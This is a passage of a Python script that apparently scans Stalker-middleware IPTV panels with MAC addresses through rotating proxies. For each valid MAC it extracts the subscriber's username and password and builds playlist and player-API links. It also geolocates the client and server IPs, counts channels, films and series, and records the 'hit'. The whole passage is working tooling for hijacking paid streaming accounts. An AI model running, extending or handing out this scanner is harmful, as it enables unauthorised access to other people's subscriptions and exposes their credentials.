			url=http+"://"+panel+"/"+uzmanm+"?type=vod&action=create_link&cmd="+str(cmd)+"&series=&forced_storage=&disable_ad=0&download=0&force_ch_link_check=0&JsHttpRequest=1-xml"
			while True:
				try:
					res=ses.get(url,headers=hea2(mac,token),proxies=proxygetir(),timeout=(3))
					veri=str(res.text)
					break
				except:pass
			if 'cmd":"' in veri:
				link=veri.split('cmd":"')[1].split('"')[0].replace('\\/','/')
				user=str(link.replace('movie/','').split('/')[3])
				real=http+"://"+link.split('://')[1].split('/')[0]+'/c/'
				pas=str(link.replace('movie/','').split('/')[4])
				cid=duzel2(veri,'id')
				m3ulink="http://"+ real.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus&output=m3u8"
		hitecho(mac, trh)
		hit = hit + 1
		if 'Unlimited' in trh:
			exp = exp + 1
			exp = exp - 1
		hitr = "\33[1;36m"
		if '-' in DaysRemain:
		    hitr = "\33[1;91m"
		    hit = hit - 1
		    continue
		    ses.close
		    res.close
		veri=""
		if user=="":
			while True:
				try:
					res = ses.get(url7(cid), headers=hea2(mac,token), proxies=proxygetir(),timeout=(3), verify=False)
					veri=str(res.text)
					if 'ffmpeg ' in veri:
					     link=veri.split('ffmpeg ')[1].split('"')[0].replace('\\/','/')
					else:
					     if 'cmd":"' in veri:
					     	link=veri.split('cmd":"')[1].split('"')[0].replace('\\/','/')
					     	user=login
					     	pas=password
					     	real='http://'+link.split('://')[1].split('/')[0]+'/c/'
					if 'ffmpeg ' in veri:
					     user=str(link.replace('live/','').split('/')[3])
					     pas=str(link.replace('live/','').split('/')[4])
					     if real==panel:
					     	real='http://'+link.split('://')[1].split('/')[0]+'/c/'
					m3ulink="http://"+ real.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus&output=m3u8"
					break
				except:pass
		durum=""
		if not link=="":
			try:
				durum=goruntu(link,cid)
			except:pass
		if not m3ulink=="":
			playerlink=str("http://"+real.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			plink=real.replace('http://','').replace('/c/','')
			playerapi=m3uapi(playerlink,mac,token,trh)
			m3uimage=m3ugoruntu(cid,user,pas,plink)
			if playerapi=="":
			    playerlink=str("http://"+panel.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			    plink=panel.replace('http://','').replace('/c/','')
			    playerapi=m3uapi(playerlink,mac,token,trh)
			    m3uimage=m3ugoruntu(cid,user,pas,plink)
		if m3uimage=="⛔ 𝗢𝗙𝗙𝗟𝗜𝗡𝗘 🍌":
			m3uvpn=m3uvpn+1
		else:
			m3uon=m3uon+1
		if durum=="⛔ 𝗨𝗦𝗘 𝗩𝗣𝗡 🍌" or durum=="INVALID OPPS":
			macvpn=macvpn+1
		else:
			macon=macon+1
		vpn=""
		if not ip =="":
			vpn=vpnip(ip)
		else:
			vpn="No Client IP──≡"
		pal=""
		url5="https://ipapi.co/"+ip+"/json/"
		while True:
    		 try:
        		 res = ses.get(url5, timeout=15, verify=False)
        		 break
    		 except:
        		 bag1=0
        		 bag1=bag1+1
        		 time.sleep(bekleme)
        		 if bag1==4:
            		  break
		try:
		       bag1=0
		       veri=str(res.text)
		       scountry=""
		       country_name =""
		       scountry=veri.split('country_code": "')[1]
		       scountry=scountry.split('"')[0]
		       country_name=veri.split('country_name": "')[1]
		       country_name=country_name.split('"')[0]
		       clisp = veri.split('isp_name": "')[1]
		       clisp = str(clisp.split('"')[0].encode('utf-8').decode('unicode-escape'))
		       clipad = veri.split('ip": "')[1]
		       clipad = clipad.split('"')[0]
		except:pass
		url5=""
		pal=panel
		pal = pal.split(':', 1)[0]
		url5="http://ip-api.com/json/"+pal
		while True:
			try:
		        	res = ses.get(url5,timeout=35, verify=False)
		        	break
			except:
		        	bag1=0
		        	bag1=bag1+1
		        	time.sleep(bekleme)
		        	if bag1==4:
		            		break
		try:
			bag1=0
			servreg=""
			sname=""
			veri=str(res.text)
			if not 'title' in veri:
		        	sip=veri.split('query":"')[1]
		        	sip=sip.split('"')[0]
		        	sname=veri.split('"org":"')[1]
		        	sname=sname.split('"')[0]
		except:pass
		url6="https://freeipapi.com/api/json/"+sip
		while True:
			try:
		        	res = ses.get(url6,timeout=35, verify=False)
		        	break
			except:
		        	bag1=0
		        	bag1=bag1+1
		        	time.sleep(bekleme)
		        	if bag1==4:
		            		break
		try:
			bag1=0
			veri=str(res.text)
			country_name=""
			scountry=""
			scount=""
			scountry=""
			if not 'title' in veri:
		        	country_name=veri.split('countryName":"')[1]
		        	country_name=str((country_name.split('"')[0]).encode('utf-8').decode("unicode-escape"))
		        	scountry=veri.split('countryCode":"')[1]
		        	scountry=scountry.split('"')[0]
		        	scount=veri.split('cityName":"')[1]
		        	scount=scount.split('"')[0]
		        	servreg=veri.split('regionName":"')[1]
		        	servreg=servreg.split('"')[0]
		except:pass
		kanalsayisi=""
		filmsayisi=""
		dizisayisi=""
		livelist=""
		vodlist=""
		serieslist=""
		try:
			urlksay="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_live_streams"
			res = ses.get(urlksay,timeout=15, verify=False)
			veri=str(res.text)
			kanalsayisi=str(veri.count("stream_id"))
			urlfsay="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_vod_streams"
			res = ses.get(urlfsay, timeout=15, verify=False)
			veri=str(res.text)
			filmsayisi=str(veri.count("stream_id"))
			urldsay="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_series"
			res = ses.get(urldsay,  timeout=15, verify=False)
			veri=str(res.text)
			dizisayisi=str(veri.count("series_id"))
		except:pass
		liveurl=http+"://"+panel+"/"+uzmanm+"?action=get_genres&type=itv&JsHttpRequest=1-xml"
		if not expires=="":
			liveurl=http+"://"+panel+"/"+uzmanm+"?type=itv&action=get_genres&JsHttpRequest=1-xml"
		if uzmanm=="stalker_portal/server/load.php":
			liveurl=http+"://"+panel+"/"+uzmanm+"?type=itv&action=get_genres&JsHttpRequest=1-xml"
		vodurl=http+"://"+panel+"/"+uzmanm+"?action=get_categories&type=vod&JsHttpRequest=1-xml"
		seriesurl=http+"://"+panel+"/"+uzmanm+"?action=get_categories&type=series&JsHttpRequest=1-xml"
		if kanalkata=="1" or kanalkata=="2":
			listlink=liveurl
			livel='⍟'
			livelist=list(listlink,mac,token,livel)
			livelist=livelist.upper()
			livelist=livelist.replace("«»","")
			livelist=livelist.replace("⍟AE"," |🇦🇪 AE")
			livelist=livelist.replace("⍟UAE"," |🇦🇪 UAE")
			livelist=livelist.replace("⍟ALL"," |🏁ALL")
			livelist=livelist.replace("⍟ALB"," |🇦🇱 ALB")
			livelist=livelist.replace("⍟ASIA"," |🈲️ ASIA")
			livelist=livelist.replace("⍟AR"," |🇸🇦 AR")
			livelist=livelist.replace("⍟AT"," |🇦🇹 AT")
			livelist=livelist.replace("⍟AU"," |🇦🇺 AU")
			livelist=livelist.replace("⍟AZ"," |🇦🇿 AZ")
			livelist=livelist.replace("⍟BE"," |🇧🇪 BE")
			livelist=livelist.replace("⍟BG"," |🇧🇬 BG")
			livelist=livelist.replace("⍟BIH"," |🇧🇦 BIH")
			livelist=livelist.replace("⍟BO"," |🇧🇴 BO")
			livelist=livelist.replace("⍟BR"," |🇧🇷 BR")
			livelist=livelist.replace("⍟CA"," |🇨🇦 CA")
			livelist=livelist.replace("⍟CH"," |🇨🇭 CH")
			livelist=livelist.replace("⍟SW"," |🇨🇭 SW")
			livelist=livelist.replace("⍟CL"," |🇨🇱 CL")
			livelist=livelist.replace("⍟CN"," |🇨🇳 CN")
			livelist=livelist.replace("⍟CO"," |🇨🇴 CO")
			livelist=livelist.replace("⍟CR"," |🇭🇷 CR")
			livelist=livelist.replace("⍟CZ"," |🇨🇿 CZ")
			livelist=livelist.replace("⍟DE "," |🇩🇪 DE")
			livelist=livelist.replace("⍟ DE "," |🇩🇪 DE")
			livelist=livelist.replace("⍟  DE "," |🇩🇪 DE")
			livelist=livelist.replace("⍟   DE "," |🇩🇪 DE")
			livelist=livelist.replace("⍟DE| "," |🇩🇪 DE|")
			livelist=livelist.replace("⍟ DE| "," |🇩🇪 DE|")
			livelist=livelist.replace("⍟  DE| "," |🇩🇪 DE|")
			livelist=livelist.replace("⍟   DE| "," |🇩🇪 DE|")
			livelist=livelist.replace("⍟[DE"," |🇩🇪 [DE")
			livelist=livelist.replace("⍟ [DE"," |🇩🇪 [DE")
			livelist=livelist.replace("⍟De"," |🇩🇪 De")
			livelist=livelist.replace("⍟ De"," |🇩🇪 De")
			livelist=livelist.replace("⍟GE"," |🇩🇪 GE")
			livelist=livelist.replace("⍟ GE"," |🇩🇪 GE")
			livelist=livelist.replace("⍟DK"," |🇩🇰 DK")
			livelist=livelist.replace("⍟ DK"," |🇩🇰 DK")
			livelist=livelist.replace("⍟DM"," |🇩🇰 DM")
			livelist=livelist.replace("⍟ DM"," |🇩🇰 DM")
			livelist=livelist.replace("⍟EC"," |🇪🇨 EC")
			livelist=livelist.replace("⍟EG"," |🇪🇬 EG")
			livelist=livelist.replace("⍟EN"," |🇬🇧 EN")
			livelist=livelist.replace("⍟GB"," |🇬🇧 GB")
			livelist=livelist.replace("⍟UK"," |🇬🇧 UK")
			livelist=livelist.replace("⍟EU"," |🇪🇺 EU")
			livelist=livelist.replace("⍟ES"," |🇪🇸 ES")
			livelist=livelist.replace("⍟SP"," |🇪🇸 SP")
			livelist=livelist.replace("⍟EX"," |🇭🇷 EX")
			livelist=livelist.replace("⍟|EX"," |🇭🇷 |EX")
			livelist=livelist.replace("⍟YU"," |🇭🇷 YU")
			livelist=livelist.replace("⍟F1"," |🏎  F1")
			livelist=livelist.replace("⍟ F1"," |🏎  F1")
			livelist=livelist.replace("⍟FI"," |🇫🇮 FI")
			livelist=livelist.replace("⍟FR"," |🇫🇷 FR")
			livelist=livelist.replace("⍟FI"," |🇫🇮 FI")
			livelist=livelist.replace("⍟GOLF"," |🏌‍♂️ GOLF")
			livelist=livelist.replace("⍟ GOLF"," |🏌‍♂️ GOLF")
			livelist=livelist.replace("⍟GOR"," |🇲🇪 GOR")
			livelist=livelist.replace("⍟GR"," |🇬🇷 GR")
			livelist=livelist.replace("⍟HR"," |🇭🇷 HR")
			livelist=livelist.replace("⍟HU"," |🇭🇺 HU")
			livelist=livelist.replace("⍟IE"," |🇮🇪 IE")
			livelist=livelist.replace("⍟IL"," |🇮🇪 IL")
			livelist=livelist.replace("⍟IR"," |🇮🇪 IR")
			livelist=livelist.replace("⍟ID"," |🇮🇩 ID")
			livelist=livelist.replace("⍟IN"," |🇮🇳 IN")
			livelist=livelist.replace("⍟IT"," |🇮🇹 IT")
			livelist=livelist.replace("⍟JP"," |🇯🇵 JP")
			livelist=livelist.replace("⍟KE"," |🇰🇪 KE")
			livelist=livelist.replace("⍟KU"," |🇭🇺 KU")
			livelist=livelist.replace("⍟KR"," |🇰🇷 KR")
			livelist=livelist.replace("⍟LU"," |🇱🇺 LU")
			livelist=livelist.replace("⍟MKD"," |🇲🇰 MKD")
			livelist=livelist.replace("⍟MX"," |🇲🇽 MX")
			livelist=livelist.replace("⍟MY"," |🇲🇾 MY")
			livelist=livelist.replace("⍟NETFLIX"," |🚩 NETFLIX")
			livelist=livelist.replace("⍟ NETFLIX"," |🚩 NETFLIX")
			livelist=livelist.replace("⍟|MULTI"," |🚩 |MULTI")
			livelist=livelist.replace("⍟ |MULTI"," |🚩 |MULTI")
			livelist=livelist.replace("⍟NG"," |🇳🇬 NG")
			livelist=livelist.replace("⍟NZ"," |🇳🇿 NZ")
			livelist=livelist.replace("⍟NL"," |🇳🇱 NL")
			livelist=livelist.replace("⍟NO"," |🇳🇴 NO")
			livelist=livelist.replace("⍟PA"," |🇵🇦 PA")
			livelist=livelist.replace("⍟PE"," |🇵🇪 PE")
			livelist=livelist.replace("⍟PH"," |🇵🇭 PH")
			livelist=livelist.replace("⍟PK"," |🇵🇰 PK")
			livelist=livelist.replace("⍟PL"," |🇵🇱 PL")
			livelist=livelist.replace("⍟PT"," |🇵🇹 PT")
			livelist=livelist.replace("⍟PPV"," |🏋🏼‍♂️ PPV")
			livelist=livelist.replace("⍟QA"," |🇶🇦 QA")
			livelist=livelist.replace("⍟RO"," |🇷🇴 RO")
			livelist=livelist.replace("⍟RU"," |🇷🇺 RU")
			livelist=livelist.replace("⍟SA"," |🇸🇦 SA")
			livelist=livelist.replace("⍟SCREENSAVER"," |🏞 SCREENSAVER")
			livelist=livelist.replace("⍟SE"," |🇸🇪 SE")
			livelist=livelist.replace("⍟SK"," |🇸🇰 SK")
			livelist=livelist.replace("⍟SL"," |🇸🇮 SL")
			livelist=livelist.replace("⍟SG"," |🇸🇬 SG")
			livelist=livelist.replace("⍟SR"," |🇷🇸 SR")
			livelist=livelist.replace("⍟SU"," |🇦🇲 SU")
			livelist=livelist.replace("⍟TH"," |🇹🇭 TH")
			livelist=livelist.replace("⍟TR"," |🇹🇷 TR")
			livelist=livelist.replace("⍟[TR"," |🇹🇷 [TR")
			livelist=livelist.replace("⍟TW"," |🇹🇼 TW")
			livelist=livelist.replace("⍟UKR"," |🇺🇦 UKR")
			livelist=livelist.replace("⍟US"," |🇺🇸 US")
			livelist=livelist.replace("⍟VN"," |🇻🇳 VN")
			livelist=livelist.replace("⍟VIP"," |⚽️ VIP")
			livelist=livelist.replace("⍟UEFA"," |⚽️ UEFA")
			livelist=livelist.replace("⍟WEB"," |🏳️‍🌈 WEB")
			livelist=livelist.replace("⍟ZA"," |🇿🇦 ZA")
			livelist=livelist.replace("⍟AF"," |🇿🇦 AF")
			livelist=livelist.replace("⍟ADULTS"," |🔞 ADULTS")
			livelist=livelist.replace("⍟FOR"," |🔞 FOR")
			livelist=livelist.replace("⍟⋅ FOR"," |🔞 ⋅ FOR")
			livelist=livelist.replace("⍟BLU"," |🔞 BLU")
			livelist=livelist.replace("⍟XXX"," |🔞 XXX")
			livelist=livelist.replace("⍟"," |©️ ")
		if kanalkata=="2":
			listlink=vodurl
			livel='⍟'
			vodlist=list(listlink,mac,token,livel)
			vodlist=vodlist.upper()
			vodlist=vodlist.replace("«»","")
			vodlist=vodlist.replace("⍟AE"," |🇦🇪 AE")
			vodlist=vodlist.replace("⍟UAE"," |🇦🇪 UAE")
			vodlist=vodlist.replace("⍟ALL"," |🏁ALL")
			vodlist=vodlist.replace("⍟ALB"," |🇦🇱 ALB")
			vodlist=vodlist.replace("⍟AR"," |🇸🇦 AR")
			vodlist=vodlist.replace("⍟ASIA"," |🈲️ ASIA")
			vodlist=vodlist.replace("⍟AT"," |🇦🇹 AT")
			vodlist=vodlist.replace("⍟AU"," |🇦🇺 AU")
			vodlist=vodlist.replace("⍟AZ"," |🇦🇿 AZ")
			vodlist=vodlist.replace("⍟BE"," |🇧🇪 BE")
			vodlist=vodlist.replace("⍟BG"," |🇧🇬 BG")
			vodlist=vodlist.replace("⍟BIH"," |🇧🇦 BIH")
			vodlist=vodlist.replace("⍟BO"," |🇧🇴 BO")
			vodlist=vodlist.replace("⍟BR"," |🇧🇷 BR")
			vodlist=vodlist.replace("⍟CA"," |🇨🇦 CA")
			vodlist=vodlist.replace("⍟CH"," |🇨🇭 CH")
			vodlist=vodlist.replace("⍟SW"," |🇨🇭 SW")
			vodlist=vodlist.replace("⍟CL"," |🇨🇱 CL")
			vodlist=vodlist.replace("⍟CN"," |🇨🇳 CN")
			vodlist=vodlist.replace("⍟CO"," |🇨🇴 CO")
			vodlist=vodlist.replace("⍟CR"," |🇭🇷 CR")
			vodlist=vodlist.replace("⍟CZ"," |🇨🇿 CZ")
			vodlist=vodlist.replace("⍟DE"," |🇩🇪 DE")
			vodlist=vodlist.replace("⍟ DE"," |🇩🇪 DE")
			vodlist=vodlist.replace("⍟  DE"," |🇩🇪 DE")
			vodlist=vodlist.replace("⍟[DE"," |🇩🇪 [DE")
			vodlist=vodlist.replace("⍟ [DE"," |🇩🇪 [DE")
			vodlist=vodlist.replace("⍟De"," |🇩🇪 De")
			vodlist=vodlist.replace("⍟ De"," |🇩🇪 De")
			vodlist=vodlist.replace("⍟GE"," |🇩🇪 GE")
			vodlist=vodlist.replace("⍟ GE"," |🇩🇪 GE")
			vodlist=vodlist.replace("⍟DK"," |🇩🇰 DK")
			vodlist=vodlist.replace("⍟DM"," |🇩🇰 DM")
			vodlist=vodlist.replace("⍟EC"," |🇪🇨 EC")
			vodlist=vodlist.replace("⍟EG"," |🇪🇬 EG")
			vodlist=vodlist.replace("⍟EN"," |🇬🇧 EN")
			vodlist=vodlist.replace("⍟GB"," |🇬🇧 GB")
			vodlist=vodlist.replace("⍟UK"," |🇬🇧 UK")
			vodlist=vodlist.replace("⍟EU"," |🇪🇺 EU")
			vodlist=vodlist.replace("⍟ES"," |🇪🇸 ES")
			vodlist=vodlist.replace("⍟SP"," |🇪🇸 SP")
			vodlist=vodlist.replace("⍟EX"," |🇭🇷 EX")
			vodlist=vodlist.replace("⍟|EX","•• |🇭🇷 |EX • ")
			vodlist=vodlist.replace("⍟YU"," |🇭🇷 YU")
			vodlist=vodlist.replace("⍟F1"," |🏎  F1")
			vodlist=vodlist.replace("⍟FI"," |🇫🇮 FI")
			vodlist=vodlist.replace("⍟FR"," |🇫🇷 FR")
			vodlist=vodlist.replace("⍟FI"," |🇫🇮 FI")
			vodlist=vodlist.replace("⍟GOR"," |🇲🇪 GOR")
			vodlist=vodlist.replace("⍟GR"," |🇬🇷 GR")
			vodlist=vodlist.replace("⍟HR"," |🇭🇷 HR")
			vodlist=vodlist.replace("⍟HU"," |🇭🇺 HU")
			vodlist=vodlist.replace("⍟IE"," |🇮🇪 IE")
			vodlist=vodlist.replace("⍟IL"," |🇮🇪 IL")
			vodlist=vodlist.replace("⍟IR"," |🇮🇪 IR")
			vodlist=vodlist.replace("⍟ID"," |🇮🇩 ID")
			vodlist=vodlist.replace("⍟IN"," |🇮🇳 IN")
			vodlist=vodlist.replace("⍟IT"," |🇮🇹 IT")
			vodlist=vodlist.replace("⍟JP"," |🇯🇵 JP")
			vodlist=vodlist.replace("⍟KE"," |🇰🇪 KE")
			vodlist=vodlist.replace("⍟KU"," |🇭🇺 KU")
			vodlist=vodlist.replace("⍟KR"," |??🇷 KR")
			vodlist=vodlist.replace("⍟LU"," |🇱🇺 LU")
			vodlist=vodlist.replace("⍟MKD"," |??🇰 MKD")
			vodlist=vodlist.replace("⍟MX"," |🇲🇽 MX")
			vodlist=vodlist.replace("⍟MY"," |🇲🇾 MY")
			vodlist=vodlist.replace("⍟NETFLIX"," | 🚩 NETFLIX")
			vodlist=vodlist.replace("⍟|MULTI"," | 🚩 |MULTI")
			vodlist=vodlist.replace("⍟NG"," |🇳🇬 NG")
			vodlist=vodlist.replace("⍟NZ"," |🇳🇿 NZ")
			vodlist=vodlist.replace("⍟NL"," |🇳🇱 NL")
			vodlist=vodlist.replace("⍟NO"," |🇳🇴 NO")
			vodlist=vodlist.replace("⍟PA"," |🇵🇦 PA")
			vodlist=vodlist.replace("⍟PE"," |🇵🇪 PE")
			vodlist=vodlist.replace("⍟PH"," |🇵🇭 PH")
			vodlist=vodlist.replace("⍟PK"," |🇵🇰 PK")
			vodlist=vodlist.replace("⍟PL"," |🇵🇱 PL")
			vodlist=vodlist.replace("⍟PT"," |🇵🇹 PT")
			vodlist=vodlist.replace("⍟PPV"," |🏋🏼‍♂️ PPV")
			vodlist=vodlist.replace("⍟QA"," |🇶🇦 QA")
			vodlist=vodlist.replace("⍟RO"," |🇷🇴 RO")
			vodlist=vodlist.replace("⍟RU"," |🇷🇺 RU")
			vodlist=vodlist.replace("⍟SA"," |🇸🇦 SA")
			vodlist=vodlist.replace("⍟SCREENSAVER"," | 🏞 SCREENSAVER")
			vodlist=vodlist.replace("⍟SE"," |🇸🇪 SE")
			vodlist=vodlist.replace("⍟SK"," |🇸🇰 SK")
			vodlist=vodlist.replace("⍟SL"," |🇸🇮 SL")
			vodlist=vodlist.replace("⍟SG"," |🇸🇬 SG")
			vodlist=vodlist.replace("⍟SR"," |🇷🇸 SR")
			vodlist=vodlist.replace("⍟SU"," |🇦🇲 SU")
			vodlist=vodlist.replace("⍟TH"," |🇹🇭 TH")
			vodlist=vodlist.replace("⍟TR"," |🇹🇷 TR")
			vodlist=vodlist.replace("⍟[TR"," |🇹🇷 [TR")
			vodlist=vodlist.replace("⍟TW"," |🇹🇼 TW")
			vodlist=vodlist.replace("⍟UKR"," |🇺🇦 UKR")
			vodlist=vodlist.replace("⍟US"," |🇺🇸 US")
			vodlist=vodlist.replace("⍟VN"," |🇻🇳 VN")
			vodlist=vodlist.replace("⍟VIP"," |⚽️ VIP")
			vodlist=vodlist.replace("⍟WEB"," |🏳️‍🌈 WEB")
			vodlist=vodlist.replace("⍟ZA"," |🇿🇦 ZA")
			vodlist=vodlist.replace("⍟AF"," |🇿🇦 AF")
			vodlist=vodlist.replace("⍟ADULTS"," |🔞 ADULTS")
			vodlist=vodlist.replace("⍟FOR"," |🔞 FOR")
			vodlist=vodlist.replace("⍟⋅ FOR"," |🔞 ⋅ FOR")
			vodlist=vodlist.replace("⍟BLU"," |🔞 BLU")
			vodlist=vodlist.replace("⍟XXX"," |🔞 XXX")
			vodlist=vodlist.replace("⍟"," |©️ ")
			listlink=seriesurl
			livel='⍟'
			serieslist=list(listlink,mac,token,livel)
			serieslist=serieslist.upper()
			serieslist=serieslist.replace("«»","")
			serieslist=serieslist.replace("⍟AE"," |🇦🇪 AE")
			serieslist=serieslist.replace("⍟UAE"," |🇦🇪 UAE")
			serieslist=serieslist.replace("⍟ALL"," |🏁ALL")
			serieslist=serieslist.replace("⍟ALB"," |🇦🇱 ALB")
			serieslist=serieslist.replace("⍟AR"," |🇸🇦 AR")
			serieslist=serieslist.replace("⍟ASIA"," |🈲️ ASIA")
			serieslist=serieslist.replace("⍟AT"," |🇦🇹 AT")
			serieslist=serieslist.replace("⍟AU"," |🇦🇺 AU")
			serieslist=serieslist.replace("⍟AZ"," |🇦🇿 AZ")
			serieslist=serieslist.replace("⍟BE"," |🇧🇪 BE")
			serieslist=serieslist.replace("⍟BG"," |🇧🇬 BG")
			serieslist=serieslist.replace("⍟BIH"," |🇧🇦 BIH")
			serieslist=serieslist.replace("⍟BO"," |🇧🇴 BO")
			serieslist=serieslist.replace("⍟BR"," |🇧🇷 BR")
			serieslist=serieslist.replace("⍟CA"," |🇨🇦 CA")
			serieslist=serieslist.replace("⍟CH"," |🇨🇭 CH")
			serieslist=serieslist.replace("⍟SW"," |🇨🇭 SW")
			serieslist=serieslist.replace("⍟CL"," |🇨🇱 CL")
			serieslist=serieslist.replace("⍟CN"," |🇨🇳 CN")
			serieslist=serieslist.replace("⍟CO"," |🇨🇴 CO")
			serieslist=serieslist.replace("⍟CR"," |🇭🇷 CR")
			serieslist=serieslist.replace("⍟CZ"," |🇨🇿 CZ")
			serieslist=serieslist.replace("⍟DE"," |🇩🇪 DE")
			serieslist=serieslist.replace("⍟ DE"," |🇩🇪 DE")
			serieslist=serieslist.replace("⍟  DE"," |🇩🇪 DE")
			serieslist=serieslist.replace("⍟[DE"," |🇩🇪 [DE")
			serieslist=serieslist.replace("⍟ [DE"," |🇩🇪 [DE")
			serieslist=serieslist.replace("⍟De"," |🇩🇪 De")
			serieslist=serieslist.replace("⍟ De"," |🇩🇪 De")
			serieslist=serieslist.replace("⍟GE"," |🇩🇪 GE")
			serieslist=serieslist.replace("⍟ GE"," |🇩🇪 GE")
			serieslist=serieslist.replace("⍟DK"," |🇩🇰 DK")
			serieslist=serieslist.replace("⍟DM"," |🇩🇰 DM")
			serieslist=serieslist.replace("⍟EC"," |🇪🇨 EC")
			serieslist=serieslist.replace("⍟EG"," |🇪🇬 EG")
			serieslist=serieslist.replace("⍟EN"," |🇬🇧 EN")
			serieslist=serieslist.replace("⍟GB"," |🇬🇧 GB")
			serieslist=serieslist.replace("⍟UK"," |🇬🇧 UK")
			serieslist=serieslist.replace("⍟EU"," |🇪🇺 EU")
			serieslist=serieslist.replace("⍟ES"," |🇪🇸 ES")
			serieslist=serieslist.replace("⍟SP"," |🇪🇸 SP")
			serieslist=serieslist.replace("⍟EX"," |🇭🇷 EX")
			serieslist=serieslist.replace("⍟|EX"," |🇭🇷 |EX")
			serieslist=serieslist.replace("⍟YU"," |🇭🇷 YU")
			serieslist=serieslist.replace("⍟F1"," |🏎  F1")
			serieslist=serieslist.replace("⍟FI"," |🇫🇮 FI")
			serieslist=serieslist.replace("⍟FR"," |🇫🇷 FR")
			serieslist=serieslist.replace("⍟FI"," |🇫🇮 FI")
			serieslist=serieslist.replace("⍟GOR"," |🇲🇪 GOR")
			serieslist=serieslist.replace("⍟GR"," |🇬🇷 GR")
			serieslist=serieslist.replace("⍟HR"," |🇭🇷 HR")
			serieslist=serieslist.replace("⍟HU"," |🇭🇺 HU")
			serieslist=serieslist.replace("⍟IE"," |🇮🇪 IE")
			serieslist=serieslist.replace("⍟IL"," |🇮🇪 IL")
			serieslist=serieslist.replace("⍟IR"," |🇮🇪 IR")
			serieslist=serieslist.replace("⍟ID"," |🇮🇩 ID")
			serieslist=serieslist.replace("⍟IN"," |🇮🇳 IN")
			serieslist=serieslist.replace("⍟IT"," |🇮🇹 IT")
			serieslist=serieslist.replace("⍟JP"," |🇯🇵 JP")
			serieslist=serieslist.replace("⍟KE"," |🇰🇪 KE")
			serieslist=serieslist.replace("⍟KU"," |🇭🇺 KU")
			serieslist=serieslist.replace("⍟KR"," |🇰🇷 KR")
			serieslist=serieslist.replace("⍟LU"," |🇱🇺 LU")
			serieslist=serieslist.replace("⍟MKD"," |🇲🇰 MKD")
			serieslist=serieslist.replace("⍟MX"," |🇲🇽 MX")
			serieslist=serieslist.replace("⍟MY"," |🇲🇾 MY")
			serieslist=serieslist.replace("⍟NETFLIX"," |🚩 NETFLIX")
			serieslist=serieslist.replace("⍟|MULTI"," |🚩 |MULTI")
			serieslist=serieslist.replace("⍟NG"," |🇳🇬 NG")
			serieslist=serieslist.replace("⍟NZ"," |🇳🇿 NZ")
			serieslist=serieslist.replace("⍟NL"," |🇳🇱 NL")
			serieslist=serieslist.replace("⍟NO"," |🇳🇴 NO")
			serieslist=serieslist.replace("⍟PA"," |🇵🇦 PA")
			serieslist=serieslist.replace("⍟PE"," |🇵🇪 PE")
			serieslist=serieslist.replace("⍟PH"," |🇵🇭 PH")
			serieslist=serieslist.replace("⍟PK"," |🇵🇰 PK")
			serieslist=serieslist.replace("⍟PL"," |🇵🇱 PL")
			serieslist=serieslist.replace("⍟PT"," |🇵🇹 PT")
			serieslist=serieslist.replace("⍟PPV"," |🏋🏼‍♂️ PPV")
			serieslist=serieslist.replace("⍟QA"," |🇶🇦 QA")
			serieslist=serieslist.replace("⍟RO"," |🇷🇴 RO")
			serieslist=serieslist.replace("⍟RU"," |🇷🇺 RU")
			serieslist=serieslist.replace("⍟SA"," |🇸🇦 SA")
			serieslist=serieslist.replace("⍟SCREENSAVER"," |🏞 SCREENSAVER")
			serieslist=serieslist.replace("⍟SE"," |🇸🇪 SE")
			serieslist=serieslist.replace("⍟SK"," |🇸🇰 SK")
			serieslist=serieslist.replace("⍟SL"," |🇸🇮 SL")
			serieslist=serieslist.replace("⍟SG"," |🇸🇬 SG")
			serieslist=serieslist.replace("⍟SR"," |🇷🇸 SR")
			serieslist=serieslist.replace("⍟SU"," |🇦🇲 SU")
			serieslist=serieslist.replace("⍟TH"," |🇹🇭 TH")
			serieslist=serieslist.replace("⍟TR"," |🇹🇷 TR")
			serieslist=serieslist.replace("⍟[TR"," |🇹?? [TR")
			serieslist=serieslist.replace("⍟TW"," |🇹🇼 TW")
			serieslist=serieslist.replace("⍟UKR"," |🇺🇦 UKR")
			serieslist=serieslist.replace("⍟US"," |🇺🇸 US")
			serieslist=serieslist.replace("⍟VN"," |🇻🇳 VN")
			serieslist=serieslist.replace("⍟VIP"," |⚽️ VIP")
			serieslist=serieslist.replace("⍟WEB"," |🏳️‍🌈 WEB")
			serieslist=serieslist.replace("⍟ZA"," |🇿🇦 ZA")
			serieslist=serieslist.replace("⍟AF"," |🇿🇦 AF")
			serieslist=serieslist.replace("⍟ADULTS"," |🔞 ADULTS")
			serieslist=serieslist.replace("⍟FOR"," |🔞 FOR")
			serieslist=serieslist.replace("⍟⋅ FOR"," |🔞 FOR")
			serieslist=serieslist.replace("⍟BLU"," |🔞 BLU")
			serieslist=serieslist.replace("⍟XXX"," |🔞 XXX")
			serieslist=serieslist.replace("⍟"," |©️ ")
		hityaz(sip,data_server,scount,servreg,sname,mac,trh,real,m3ulink,m3uimage,durum,vpn,livelist,vodlist,serieslist,playerapi,fname,tariff_plan,ls,login,password,tariff_plan_id,bill,expire_billing_date,max_online,parent_password,stb_type,comment,country,settings_password,country_name,scountry,kanalsayisi,filmsayisi,dizisayisi,ip)
def vpnip(ip):
	url9="https://freeipapi.com/api/json/"+ip
	vpnip=""
	vpn="𝙽𝙾𝚃 𝙸𝙽𝚅𝙰𝙻𝙸𝙳"
	veri=""
	try:
		res = ses.get(url9,  timeout=7, verify=False)
		veri=str(res.text)
	except:
		vpn="𝙽𝙾𝚃 𝙸𝙽𝚅𝙰𝙻𝙸𝙳"
	if not '404 page' in veri:
		if 'countryName' in veri:
			vpnc=veri.split('cityName":"')[1]
			vpnc=vpnc.split('"')[0]
			vpnips=veri.split('countryName":"')[1]
			vpnips=vpnips.split('"')[0]
			vpn= vpnips +'/' +vpnc
		else:
			vpn="𝙽𝙾𝚃 𝙸𝙽𝚅𝙰𝙻𝙸𝙳"
	return vpn
os.system("cls" if os.name == "nt" else "clear")
os.system("cls" if os.name == "nt" else "clear")
print(PRL)
Pro = "2"
if Pro == "1" and proxix == "2":
